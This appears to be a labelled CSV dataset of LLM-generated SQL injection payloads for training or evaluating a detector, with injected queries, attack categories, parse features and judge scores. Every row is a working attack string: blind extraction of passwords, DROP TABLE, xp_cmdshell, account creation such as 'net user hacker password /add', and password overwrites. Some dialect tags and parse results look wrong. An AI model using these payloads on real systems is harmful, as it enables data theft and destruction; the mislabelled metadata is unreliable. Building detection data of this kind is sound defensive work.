query_id,payload,full_query,llm_attack_category,template_context,label,mutation_count,codebert_score,ast_is_valid,ast_dialect,ast_node_set,sandbox_executed,sandbox_detection_mode,sandbox_exploit_type,judge_malicious_intent_preserved,judge_realistic_for_context,judge_non_trivial_mutation,judge_overall_quality_score,judge_reason
q01149,"1' AND CHAR_LENGTH((SELECT CONCAT(username,password) FROM users WHERE id=1)) > 25 --","SELECT * FROM orders WHERE status = '1' AND CHAR_LENGTH((SELECT CONCAT(username,password) FROM users WHERE id=1)) > 25 --' ORDER BY date DESC",blind_time,order_filter,1,0,0.0,True,default,"[""GT"", ""Length"", ""Subquery"", ""Literal"", ""Star"", ""Column"", ""And"", ""Identifier"", ""Table"", ""Select"", ""Where"", ""EQ"", ""From"", ""Concat""]",True,payload_fragment,blind_boolean,True,True,True,5,malicious intent appears preserved; candidate is plausible for order_filter; mutation appears non-trivial based on content and notes.
q01150,' OR '1'='1' AND SLEEP(5) AND '0'='0,SELECT * FROM orders WHERE status = '' OR '1'='1' AND SLEEP(5) AND '0'='0' ORDER BY date DESC,blind_time,order_filter,1,0,0.0,True,default,"[""Or"", ""Literal"", ""Star"", ""Column"", ""And"", ""Identifier"", ""Table"", ""Select"", ""Where"", ""EQ"", ""From"", ""Anonymous""]",True,payload_fragment,blind_time,True,True,True,5,malicious intent appears preserved; candidate is plausible for order_filter; mutation appears non-trivial based on content and notes.
q01151,'; DROP TABLE IF EXISTS temp_table; --,SELECT * FROM orders WHERE status = ''; DROP TABLE IF EXISTS temp_table; --' ORDER BY date DESC,blind_time,order_filter,1,0,0.0,True,default,"[""Semicolon"", ""Literal"", ""Drop"", ""Column"", ""Identifier"", ""Star"", ""Table"", ""Select"", ""Where"", ""EQ"", ""From""]",True,payload_fragment,stacked_queries,True,True,True,5,malicious intent appears preserved; candidate is plausible for order_filter; mutation appears non-trivial based on content and notes.
q01152,"'"" OR BENCHMARK(1000000,MD5('a'))--","INSERT INTO comments (user_id, body) VALUES (1, ''"" OR BENCHMARK(1000000,MD5('a'))--')",blind_time,comment_insert,1,0,0.0,True,default,"[""Or"", ""Literal"", ""Star"", ""Column"", ""Identifier"", ""Table"", ""MD5"", ""Select"", ""Where"", ""EQ"", ""From"", ""Anonymous""]",True,payload_fragment,blind_time,True,True,True,5,malicious intent appears preserved; candidate is plausible for comment_insert; mutation appears non-trivial based on content and notes.
q01154,"' OR ASCII(SUBSTRING((SELECT name FROM sys.databases WHERE dbid=2),1,1))>97 --","INSERT INTO comments (user_id, body) VALUES (1, '' OR ASCII(SUBSTRING((SELECT name FROM sys.databases WHERE dbid=2),1,1))>97 --')",blind_time,comment_insert,1,0,0.0,True,default,"[""Or"", ""GT"", ""Subquery"", ""Literal"", ""Star"", ""Column"", ""Identifier"", ""Substring"", ""Ascii"", ""Table"", ""Select"", ""Where"", ""EQ"", ""From""]",True,payload_fragment,blind_time,True,True,True,5,malicious intent appears preserved; candidate is plausible for comment_insert; mutation appears non-trivial based on content and notes.
q01155,"' OR 1=(CASE WHEN BENCHMARK(2000000,'a') THEN 1 ELSE 0 END)--","INSERT INTO comments (user_id, body) VALUES (1, '' OR 1=(CASE WHEN BENCHMARK(2000000,'a') THEN 1 ELSE 0 END)--')",blind_time,comment_insert,1,0,0.0,True,default,"[""Or"", ""Literal"", ""Star"", ""Column"", ""Identifier"", ""If"", ""Paren"", ""Table"", ""Select"", ""Where"", ""EQ"", ""From"", ""Anonymous"", ""Case""]",True,payload_fragment,blind_time,True,True,True,5,malicious intent appears preserved; candidate is plausible for comment_insert; mutation appears non-trivial based on content and notes.
q01157,"' OR ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))<=97--","INSERT INTO comments (user_id, body) VALUES (1, '' OR ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))<=97--')",blind_time,comment_insert,1,0,0.0,True,default,"[""Or"", ""Subquery"", ""LTE"", ""Literal"", ""Limit"", ""Column"", ""Identifier"", ""Star"", ""Substring"", ""Ascii"", ""Table"", ""Select"", ""Where"", ""EQ"", ""From""]",True,payload_fragment,tautology,True,True,True,5,malicious intent appears preserved; candidate is plausible for comment_insert; mutation appears non-trivial based on content and notes.
q01158,"--' OR EXISTS(SELECT * FROM employees WHERE TIMESTAMPDIFF(SECOND,NOW(),NULL)>5) --","INSERT INTO comments (user_id, body) VALUES (1, '--' OR EXISTS(SELECT * FROM employees WHERE TIMESTAMPDIFF(SECOND,NOW(),NULL)>5) --')",blind_time,comment_insert,1,0,0.0,True,default,[],True,complete_query,comment_obfuscation,True,True,True,5,malicious intent appears preserved; candidate is plausible for comment_insert; mutation appears non-trivial based on content and notes.
q01159,--' OR SLEEP(FLOOR(RAND()*5)*5),"INSERT INTO comments (user_id, body) VALUES (1, '--' OR SLEEP(FLOOR(RAND()*5)*5)')",blind_time,comment_insert,1,0,0.0,True,default,[],True,complete_query,comment_obfuscation,True,True,True,5,malicious intent appears preserved; candidate is plausible for comment_insert; mutation appears non-trivial based on content and notes.
q01160,"' OR BENCHMARK(CEIL(RAND()*5)*1000000,'a')","INSERT INTO comments (user_id, body) VALUES (1, '' OR BENCHMARK(CEIL(RAND()*5)*1000000,'a')')",blind_time,comment_insert,1,0,0.0,True,default,"[""Or"", ""Rand"", ""Literal"", ""Ceil"", ""Mul"", ""Column"", ""Identifier"", ""Star"", ""Table"", ""Select"", ""Where"", ""EQ"", ""From"", ""Anonymous""]",True,payload_fragment,blind_time,True,True,True,5,malicious intent appears preserved; candidate is plausible for comment_insert; mutation appears non-trivial based on content and notes.
q01161,"--' OR TIMESTAMPDIFF(MINUTE,NOW(),NULL)>RAND()*5","INSERT INTO comments (user_id, body) VALUES (1, '--' OR TIMESTAMPDIFF(MINUTE,NOW(),NULL)>RAND()*5')",blind_time,comment_insert,1,0,0.0,True,default,[],True,complete_query,comment_obfuscation,True,True,True,5,malicious intent appears preserved; candidate is plausible for comment_insert; mutation appears non-trivial based on content and notes.
q01162,"' OR ASCII(SUBSTRING((SELECT username FROM accounts LIMIT 1),1,1))>((RAND()+1)*65+32)","INSERT INTO comments (user_id, body) VALUES (1, '' OR ASCII(SUBSTRING((SELECT username FROM accounts LIMIT 1),1,1))>((RAND()+1)*65+32)')",blind_time,comment_insert,1,0,0.0,True,default,"[""Rand"", ""Subquery"", ""Mul"", ""Star"", ""Add"", ""Select"", ""Limit"", ""Ascii"", ""Paren"", ""GT"", ""Identifier"", ""Substring"", ""Or"", ""From"", ""Literal"", ""Column"", ""Table"", ""Where"", ""EQ""]",True,payload_fragment,tautology,True,True,True,5,malicious intent appears preserved; candidate is plausible for comment_insert; mutation appears non-trivial based on content and notes.
q01163,--' OR EXTRACT(HOUR FROM NOW())<>RAND()*24,"INSERT INTO comments (user_id, body) VALUES (1, '--' OR EXTRACT(HOUR FROM NOW())<>RAND()*24')",blind_time,comment_insert,1,0,0.0,True,default,[],True,complete_query,comment_obfuscation,True,True,True,5,malicious intent appears preserved; candidate is plausible for comment_insert; mutation appears non-trivial based on content and notes.
q01165,"OR '1'='1"";","SELECT * FROM users WHERE username = 'OR '1'='1"";' AND password = 'anything'",stacked_queries,login,1,0,0.0,True,default,"[""Star"", ""Column"", ""Identifier"", ""Table"", ""Select"", ""Where"", ""EQ"", ""From""]",True,payload_fragment,tautology,True,True,True,5,malicious intent appears preserved; candidate is plausible for login; mutation appears non-trivial based on content and notes.
q01166,"--') UNION ALL SELECT 'x', 'y', 'z', NULL--""","SELECT * FROM users WHERE username = '--') UNION ALL SELECT 'x', 'y', 'z', NULL--""' AND password = 'anything'",stacked_queries,login,1,0,0.0,True,default,[],True,complete_query,comment_obfuscation,True,True,True,5,malicious intent appears preserved; candidate is plausible for login; mutation appears non-trivial based on content and notes.
q01167,"OR ('1'='1' AND DBMS_PIPE.RECEIVE_MESSAGE('BCOe', 5) = -1","SELECT * FROM users WHERE username = 'OR ('1'='1' AND DBMS_PIPE.RECEIVE_MESSAGE('BCOe', 5) = -1' AND password = 'anything'",stacked_queries,login,1,0,0.0,True,clickhouse,"[""Literal"", ""Anonymous"", ""And"", ""Identifier"", ""Neg"", ""EQ"", ""Dot""]",True,complete_query,blind_time,True,True,True,5,malicious intent appears preserved; candidate is plausible for login; mutation appears non-trivial based on content and notes.
q01168,OR (SELECT 1 FROM users WHERE username = 'admin' AND password = 'admin'); --,SELECT * FROM users WHERE username = 'OR (SELECT 1 FROM users WHERE username = 'admin' AND password = 'admin'); --' AND password = 'anything',stacked_queries,login,1,0,0.0,True,default,"[""Or"", ""Semicolon"", ""Subquery"", ""Literal"", ""Star"", ""Column"", ""And"", ""Identifier"", ""Table"", ""Select"", ""Where"", ""EQ"", ""From""]",True,payload_fragment,comment_obfuscation,True,True,True,5,malicious intent appears preserved; candidate is plausible for login; mutation appears non-trivial based on content and notes.
q01169,"--') UNION ALL SELECT username, password, email, NULL FROM another_table--","SELECT * FROM users WHERE username = '--') UNION ALL SELECT username, password, email, NULL FROM another_table--' AND password = 'anything'",stacked_queries,login,1,0,0.0,True,default,[],True,complete_query,comment_obfuscation,True,True,True,5,malicious intent appears preserved; candidate is plausible for login; mutation appears non-trivial based on content and notes.
q01170,"OR ('1'='1' AND ASCII(SUBSTRING((SELECT GROUP_CONCAT(username, password) FROM users), 1, 1)) = 97); --","SELECT * FROM users WHERE username = 'OR ('1'='1' AND ASCII(SUBSTRING((SELECT GROUP_CONCAT(username, password) FROM users), 1, 1)) = 97); --' AND password = 'anything'",stacked_queries,login,1,0,0.0,True,default,"[""Or"", ""Semicolon"", ""Subquery"", ""Literal"", ""Star"", ""Column"", ""And"", ""Identifier"", ""Where"", ""Substring"", ""Ascii"", ""Paren"", ""Table"", ""GroupConcat"", ""Select"", ""EQ"", ""From""]",True,payload_fragment,tautology,True,True,True,5,malicious intent appears preserved; candidate is plausible for login; mutation appears non-trivial based on content and notes.
q01172,; EXEC xp_cmdshell 'echo Hacked > C:\hacked.txt'; --,SELECT * FROM users WHERE username = '; EXEC xp_cmdshell 'echo Hacked > C:\hacked.txt'; --' AND password = 'anything',stacked_queries,login,1,0,0.0,True,postgres,"[""Literal"", ""Command"", ""Semicolon""]",True,complete_query,blind_time,True,True,True,5,malicious intent appears preserved; candidate is plausible for login; mutation appears non-trivial based on content and notes.
q01176,"; EXECUTE sp_configure 'show advanced options', 1; RECONFIGURE; EXECUTE sp_addextendedproperty 'MS_Description', 'Unauthorized admin access granted', 'SCHEMA', 'dbo', 'TABLE', 'users', 'COLUMN', 'admin';","SELECT * FROM products WHERE name LIKE '%; EXECUTE sp_configure 'show advanced options', 1; RECONFIGURE; EXECUTE sp_addextendedproperty 'MS_Description', 'Unauthorized admin access granted', 'SCHEMA', 'dbo', 'TABLE', 'users', 'COLUMN', 'admin';%'",stacked_queries,search,1,0,0.0,True,default,"[""Literal"", ""Command"", ""Column"", ""Identifier""]",True,complete_query,blind_time,True,True,True,5,malicious intent appears preserved; candidate is plausible for search; mutation appears non-trivial based on content and notes.
q01179,'; ALTER TABLE products ADD COLUMN is_deleted BIT DEFAULT 0;,SELECT * FROM products WHERE name LIKE '%'; ALTER TABLE products ADD COLUMN is_deleted BIT DEFAULT 0;%',stacked_queries,search,1,0,0.0,True,default,"[""EQ"", ""DataType"", ""DefaultColumnConstraint"", ""Literal"", ""Star"", ""Column"", ""ColumnConstraint"", ""Identifier"", ""Table"", ""ColumnDef"", ""Select"", ""Where"", ""Alter"", ""From""]",True,payload_fragment,stacked_queries,True,True,True,5,malicious intent appears preserved; candidate is plausible for search; mutation appears non-trivial based on content and notes.
q01181,'; DECLARE @cmd VARCHAR(255);SET @cmd='net user hacker password /add';EXEC(@cmd) --,SELECT * FROM products WHERE name LIKE '%'; DECLARE @cmd VARCHAR(255);SET @cmd='net user hacker password /add';EXEC(@cmd) --%',stacked_queries,search,1,0,0.0,True,postgres,"[""Command"", ""SetItem"", ""Parameter"", ""Literal"", ""Star"", ""Column"", ""Identifier"", ""Set"", ""Table"", ""Select"", ""Where"", ""EQ"", ""From"", ""Var""]",True,payload_fragment,stacked_queries,True,True,True,5,malicious intent appears preserved; candidate is plausible for search; mutation appears non-trivial based on content and notes.
q01182,1'; INSERT INTO logs VALUES('injection');--,SELECT * FROM users WHERE id = 1'; INSERT INTO logs VALUES('injection');--,stacked_queries,user_lookup,1,0,0.0,True,default,"[""Tuple"", ""Semicolon"", ""Values"", ""Literal"", ""Star"", ""Column"", ""Identifier"", ""Insert"", ""Table"", ""Select"", ""Where"", ""EQ"", ""From""]",True,payload_fragment,stacked_queries,True,True,True,5,malicious intent appears preserved; candidate is plausible for user_lookup; mutation appears non-trivial based on content and notes.
q01183,"1""; CREATE USER hacker WITH PASSWORD 'password';--","SELECT * FROM users WHERE id = 1""; CREATE USER hacker WITH PASSWORD 'password';--",stacked_queries,user_lookup,1,0,0.0,True,default,"[""Command"", ""Semicolon"", ""Star"", ""Column"", ""Identifier"", ""Table"", ""Select"", ""Where"", ""EQ"", ""From""]",True,payload_fragment,stacked_queries,True,True,True,5,malicious intent appears preserved; candidate is plausible for user_lookup; mutation appears non-trivial based on content and notes.
q01184,'; EXECUTE IMMEDIATE 'DROP DATABASE IF EXISTS test_db';--,SELECT * FROM users WHERE id = '; EXECUTE IMMEDIATE 'DROP DATABASE IF EXISTS test_db';--,stacked_queries,user_lookup,1,0,0.0,True,default,"[""Command"", ""Semicolon"", ""Literal"", ""Star"", ""Column"", ""Identifier"", ""Table"", ""Select"", ""Where"", ""EQ"", ""From""]",True,payload_fragment,stacked_queries,True,True,True,5,malicious intent appears preserved; candidate is plausible for user_lookup; mutation appears non-trivial based on content and notes.
q01185,'; UPDATE users SET password='hacked!' WHERE id=1;--,SELECT * FROM users WHERE id = '; UPDATE users SET password='hacked!' WHERE id=1;--,stacked_queries,user_lookup,1,0,0.0,True,default,"[""Semicolon"", ""Literal"", ""Star"", ""Column"", ""Identifier"", ""Table"", ""Update"", ""Select"", ""Where"", ""EQ"", ""From""]",True,payload_fragment,stacked_queries,True,True,True,5,malicious intent appears preserved; candidate is plausible for user_lookup; mutation appears non-trivial based on content and notes.
q01187,; EXEC sp_executesql N'SELECT * FROM users WHERE username LIKE ''%a''; DROP TABLE orders',SELECT * FROM orders WHERE status = '; EXEC sp_executesql N'SELECT * FROM users WHERE username LIKE ''%a''; DROP TABLE orders'' ORDER BY date DESC,stacked_queries,order_filter,1,0,0.0,True,postgres,"[""Literal"", ""Command""]",True,complete_query,blind_time,True,True,True,5,malicious intent appears preserved; candidate is plausible for order_filter; mutation appears non-trivial based on content and notes.
q01188,'; INSERT INTO logs (message) VALUES ('SQL Injection Detected');--,SELECT * FROM orders WHERE status = ''; INSERT INTO logs (message) VALUES ('SQL Injection Detected');--' ORDER BY date DESC,stacked_queries,order_filter,1,0,0.0,True,default,"[""Tuple"", ""Semicolon"", ""Values"", ""Literal"", ""Star"", ""Column"", ""Identifier"", ""Insert"", ""Where"", ""Table"", ""Schema"", ""Select"", ""EQ"", ""From""]",True,payload_fragment,stacked_queries,True,True,True,5,malicious intent appears preserved; candidate is plausible for order_filter; mutation appears non-trivial based on content and notes.
q01189,1' OR (SELECT COUNT(*) FROM users) > 0 --,SELECT * FROM orders WHERE status = '1' OR (SELECT COUNT(*) FROM users) > 0 --' ORDER BY date DESC,stacked_queries,order_filter,1,0,0.0,True,default,"[""Count"", ""Or"", ""GT"", ""Subquery"", ""Literal"", ""Star"", ""Column"", ""Identifier"", ""Table"", ""Select"", ""Where"", ""EQ"", ""From""]",True,payload_fragment,tautology,True,True,True,5,malicious intent appears preserved; candidate is plausible for order_filter; mutation appears non-trivial based on content and notes.
q01191,'--; SELECT * FROM orders WHERE status = 'attacked'; DROP TABLE customers;,SELECT * FROM orders WHERE status = ''--; SELECT * FROM orders WHERE status = 'attacked'; DROP TABLE customers;' ORDER BY date DESC,stacked_queries,order_filter,1,0,0.0,True,default,"[""Literal"", ""Star"", ""Column"", ""Identifier"", ""Table"", ""Select"", ""Where"", ""EQ"", ""From""]",True,payload_fragment,stacked_queries,True,True,True,5,malicious intent appears preserved; candidate is plausible for order_filter; mutation appears non-trivial based on content and notes.
q01192,'; SELECT pg_sleep(5) FROM users WHERE username = '';--,SELECT * FROM orders WHERE status = ''; SELECT pg_sleep(5) FROM users WHERE username = '';--' ORDER BY date DESC,stacked_queries,order_filter,1,0,0.0,True,default,"[""Semicolon"", ""Literal"", ""Star"", ""Column"", ""Identifier"", ""Table"", ""Select"", ""Where"", ""EQ"", ""From"", ""Anonymous""]",True,payload_fragment,stacked_queries,True,True,True,5,malicious intent appears preserved; candidate is plausible for order_filter; mutation appears non-trivial based on content and notes.
q01193,1' OR EXISTS(SELECT * FROM users WHERE username = 'admin') --,SELECT * FROM orders WHERE status = '1' OR EXISTS(SELECT * FROM users WHERE username = 'admin') --' ORDER BY date DESC,stacked_queries,order_filter,1,0,0.0,True,default,"[""Or"", ""Literal"", ""Star"", ""Column"", ""Identifier"", ""Table"", ""Select"", ""Where"", ""EQ"", ""From"", ""Exists""]",True,payload_fragment,tautology,True,True,True,5,malicious intent appears preserved; candidate is plausible for order_filter; mutation appears non-trivial based on content and notes.
q01194,; DECLARE @x NVARCHAR(MAX); SET @x = CAST('SQL Injection Detected' AS NVARCHAR(MAX)); PRINT @x;,SELECT * FROM orders WHERE status = '; DECLARE @x NVARCHAR(MAX); SET @x = CAST('SQL Injection Detected' AS NVARCHAR(MAX)); PRINT @x;' ORDER BY date DESC,stacked_queries,order_filter,1,0,0.0,True,postgres,"[""DataTypeParam"", ""Cast"", ""Command"", ""DataType"", ""Parameter"", ""Literal"", ""Column"", ""Identifier"", ""Set"", ""EQ"", ""SetItem"", ""Var"", ""Alias""]",True,complete_query,blind_time,True,True,True,5,malicious intent appears preserved; candidate is plausible for order_filter; mutation appears non-trivial based on content and notes.
q01195,' OR 1=1; DROP TABLE orders --,SELECT * FROM orders WHERE status = '' OR 1=1; DROP TABLE orders --' ORDER BY date DESC,stacked_queries,order_filter,1,0,0.0,True,default,"[""Or"", ""Literal"", ""Drop"", ""Column"", ""Identifier"", ""Star"", ""Table"", ""Select"", ""Where"", ""EQ"", ""From""]",True,payload_fragment,stacked_queries,True,True,True,5,malicious intent appears preserved; candidate is plausible for order_filter; mutation appears non-trivial based on content and notes.
q01196,"' UNION SELECT NULL, NULL, NULL, NULL FROM products WHERE price < 1000;","SELECT * FROM orders WHERE status = '' UNION SELECT NULL, NULL, NULL, NULL FROM products WHERE price < 1000;' ORDER BY date DESC",stacked_queries,order_filter,1,0,0.0,True,default,"[""Literal"", ""Star"", ""Column"", ""Identifier"", ""Table"", ""Null"", ""LT"", ""Select"", ""Where"", ""EQ"", ""From"", ""Union""]",True,payload_fragment,blind_boolean,True,True,True,5,malicious intent appears preserved; candidate is plausible for order_filter; mutation appears non-trivial based on content and notes.
q01198,''' UNION SELECT NULL--,"INSERT INTO comments (user_id, body) VALUES (1, '''' UNION SELECT NULL--')",stacked_queries,comment_insert,1,0,0.0,True,default,"[""Literal"", ""Star"", ""Column"", ""Identifier"", ""Table"", ""Null"", ""Select"", ""Where"", ""EQ"", ""From"", ""Union""]",True,payload_fragment,blind_boolean,True,True,True,5,malicious intent appears preserved; candidate is plausible for comment_insert; mutation appears non-trivial based on content and notes.
q01199,'; DROP TABLE comments; --,"INSERT INTO comments (user_id, body) VALUES (1, ''; DROP TABLE comments; --')",stacked_queries,comment_insert,1,0,0.0,True,default,"[""Semicolon"", ""Literal"", ""Drop"", ""Column"", ""Identifier"", ""Star"", ""Table"", ""Select"", ""Where"", ""EQ"", ""From""]",True,payload_fragment,stacked_queries,True,True,True,5,malicious intent appears preserved; candidate is plausible for comment_insert; mutation appears non-trivial based on content and notes.
q01201,'; EXEC sp_executesql N'SELECT * FROM users;',"INSERT INTO comments (user_id, body) VALUES (1, ''; EXEC sp_executesql N'SELECT * FROM users;'')",stacked_queries,comment_insert,1,0,0.0,True,postgres,"[""Command"", ""Literal"", ""Star"", ""Column"", ""Identifier"", ""Table"", ""Select"", ""Where"", ""EQ"", ""From""]",True,payload_fragment,stacked_queries,True,True,True,5,malicious intent appears preserved; candidate is plausible for comment_insert; mutation appears non-trivial based on content and notes.
q01203,';--'; UPDATE settings SET value='malicious' WHERE key='admin_password';,"INSERT INTO comments (user_id, body) VALUES (1, '';--'; UPDATE settings SET value='malicious' WHERE key='admin_password';')",stacked_queries,comment_insert,1,0,0.0,True,default,"[""Literal"", ""Column"", ""Identifier"", ""Table"", ""Update"", ""Where"", ""EQ""]",True,complete_query,comment_obfuscation,True,True,True,5,malicious intent appears preserved; candidate is plausible for comment_insert; mutation appears non-trivial based on content and notes.
q01206,"1; --
EXEC('DELETE FROM logs');","INSERT INTO comments (user_id, body) VALUES (1, '1; --
EXEC('DELETE FROM logs');')",stacked_queries,comment_insert,1,0,0.0,True,default,"[""Literal"", ""Semicolon"", ""Anonymous""]",True,complete_query,blind_time,True,True,True,5,malicious intent appears preserved; candidate is plausible for comment_insert; mutation appears non-trivial based on content and notes.
q01208,'; DROP TABLE users; --,SELECT * FROM users WHERE username = ''; DROP TABLE users; --' AND password = 'anything',comment_obfuscation,login,1,0,0.0,True,default,"[""Semicolon"", ""Literal"", ""Drop"", ""Column"", ""Identifier"", ""Star"", ""Table"", ""Select"", ""Where"", ""EQ"", ""From""]",True,payload_fragment,stacked_queries,True,True,True,5,malicious intent appears preserved; candidate is plausible for login; mutation appears non-trivial based on content and notes.
q01209,--/*'XOR(SELECT COUNT(*) FROM (SELECT 1 UNION SELECT 2))--,SELECT * FROM users WHERE username = '--/*'XOR(SELECT COUNT(*) FROM (SELECT 1 UNION SELECT 2))--' AND password = 'anything',comment_obfuscation,login,1,0,0.0,True,default,[],True,complete_query,comment_obfuscation,True,True,True,5,malicious intent appears preserved; candidate is plausible for login; mutation appears non-trivial based on content and notes.
q01210,#'AND EXISTS(SELECT * FROM (SELECT CASE WHEN 1=1 THEN 1 ELSE 0 END))#,SELECT * FROM users WHERE username = '#'AND EXISTS(SELECT * FROM (SELECT CASE WHEN 1=1 THEN 1 ELSE 0 END))#' AND password = 'anything',comment_obfuscation,login,1,0,0.0,True,mysql,[],True,complete_query,blind_boolean,True,True,True,5,malicious intent appears preserved; candidate is plausible for login; mutation appears non-trivial based on content and notes.
q01212,'/*' OR 1=1 */--,SELECT * FROM users WHERE username = ''/*' OR 1=1 */--' AND password = 'anything',comment_obfuscation,login,1,0,0.0,True,default,"[""Literal"", ""Star"", ""Column"", ""Identifier"", ""Table"", ""Select"", ""Where"", ""EQ"", ""From""]",True,payload_fragment,comment_obfuscation,True,True,True,5,malicious intent appears preserved; candidate is plausible for login; mutation appears non-trivial based on content and notes.
q01213,"#' UNION ALL SELECT NULL,NULL'#","SELECT * FROM users WHERE username = '#' UNION ALL SELECT NULL,NULL'#' AND password = 'anything'",comment_obfuscation,login,1,0,0.0,True,mysql,[],True,complete_query,comment_obfuscation,True,True,True,5,malicious intent appears preserved; candidate is plausible for login; mutation appears non-trivial based on content and notes.
q01214,"[""-- /* XOR(SELECT COUNT(*) FROM (SELECT 1 UNION SELECT 2)) */"", ""# AND EXISTS(SELECT * FROM (SELECT CASE WHEN 1=1 THEN 1 ELSE 0 END))#"", ""' OR ('1'='1""); ""; WAITFOR DELAY '0:0:5'; --""]","SELECT * FROM users WHERE username = '[""-- /* XOR(SELECT COUNT(*) FROM (SELECT 1 UNION SELECT 2)) */"", ""# AND EXISTS(SELECT * FROM (SELECT CASE WHEN 1=1 THEN 1 ELSE 0 END))#"", ""' OR ('1'='1""); ""; WAITFOR DELAY '0:0:5'; --""]' AND password = 'anything'",comment_obfuscation,login,1,0,0.0,True,default,"[""Star"", ""Column"", ""Identifier"", ""Table"", ""Select"", ""Where"", ""EQ"", ""From""]",True,payload_fragment,comment_obfuscation,True,True,True,5,malicious intent appears preserved; candidate is plausible for login; mutation appears non-trivial based on content and notes.
q01215,--' OR '1'='1',SELECT * FROM products WHERE name LIKE '%--' OR '1'='1'%',comment_obfuscation,search,1,0,0.0,True,default,[],True,complete_query,comment_obfuscation,True,True,True,5,malicious intent appears preserved; candidate is plausible for search; mutation appears non-trivial based on content and notes.
q01217,--%23 OR '1'='1',SELECT * FROM products WHERE name LIKE '%--%23 OR '1'='1'%',comment_obfuscation,search,1,0,0.0,True,default,[],True,complete_query,comment_obfuscation,True,True,True,5,malicious intent appears preserved; candidate is plausible for search; mutation appears non-trivial based on content and notes.
q01218,"#'%""' OR '1'='1'","SELECT * FROM products WHERE name LIKE '%#'%""' OR '1'='1'%'",comment_obfuscation,search,1,0,0.0,True,mysql,[],True,complete_query,tautology,True,True,True,5,malicious intent appears preserved; candidate is plausible for search; mutation appears non-trivial based on content and notes.
q01219,;(CASE WHEN '1'='1' THEN CAST('1' AS INT) ELSE '0' END);--,SELECT * FROM products WHERE name LIKE '%;(CASE WHEN '1'='1' THEN CAST('1' AS INT) ELSE '0' END);--%',comment_obfuscation,search,1,0,0.0,True,default,"[""Cast"", ""DataType"", ""Semicolon"", ""Literal"", ""If"", ""Paren"", ""EQ"", ""Case""]",True,complete_query,blind_boolean,True,True,True,5,malicious intent appears preserved; candidate is plausible for search; mutation appears non-trivial based on content and notes.
q01220,"[""--/*#*/' OR '1'='1'"", ""#' OR '1'='1'"", ""--%23 OR '1'='1'"", #""%""' OR '1'='1'"", "";(CASE WHEN '1'='1' THEN CAST('1' AS INT) ELSE '0' END);--""]","SELECT * FROM products WHERE name LIKE '%[""--/*#*/' OR '1'='1'"", ""#' OR '1'='1'"", ""--%23 OR '1'='1'"", #""%""' OR '1'='1'"", "";(CASE WHEN '1'='1' THEN CAST('1' AS INT) ELSE '0' END);--""]%'",comment_obfuscation,search,1,0,0.0,True,default,"[""Star"", ""Column"", ""Identifier"", ""Table"", ""Select"", ""Where"", ""EQ"", ""From""]",True,payload_fragment,comment_obfuscation,True,True,True,5,malicious intent appears preserved; candidate is plausible for search; mutation appears non-trivial based on content and notes.
q01221,--/**/1' AND (SELECT COUNT(*) FROM users WHERE username LIKE '%admin%')--,SELECT * FROM users WHERE id = --/**/1' AND (SELECT COUNT(*) FROM users WHERE username LIKE '%admin%')--,comment_obfuscation,user_lookup,1,0,0.0,True,default,[],True,complete_query,comment_obfuscation,True,True,True,5,malicious intent appears preserved; candidate is plausible for user_lookup; mutation appears non-trivial based on content and notes.
q01222,1'; DROP TABLE IF EXISTS temp; --,SELECT * FROM users WHERE id = 1'; DROP TABLE IF EXISTS temp; --,comment_obfuscation,user_lookup,1,0,0.0,True,default,"[""Semicolon"", ""Literal"", ""Drop"", ""Column"", ""Identifier"", ""Star"", ""Table"", ""Select"", ""Where"", ""EQ"", ""From""]",True,payload_fragment,stacked_queries,True,True,True,5,malicious intent appears preserved; candidate is plausible for user_lookup; mutation appears non-trivial based on content and notes.
q01223,1'/* OR 1 */=1--,SELECT * FROM users WHERE id = 1'/* OR 1 */=1--,comment_obfuscation,user_lookup,1,0,0.0,True,default,"[""Literal"", ""Star"", ""Column"", ""Identifier"", ""Table"", ""Select"", ""Where"", ""EQ"", ""From""]",True,payload_fragment,comment_obfuscation,True,True,True,5,malicious intent appears preserved; candidate is plausible for user_lookup; mutation appears non-trivial based on content and notes.
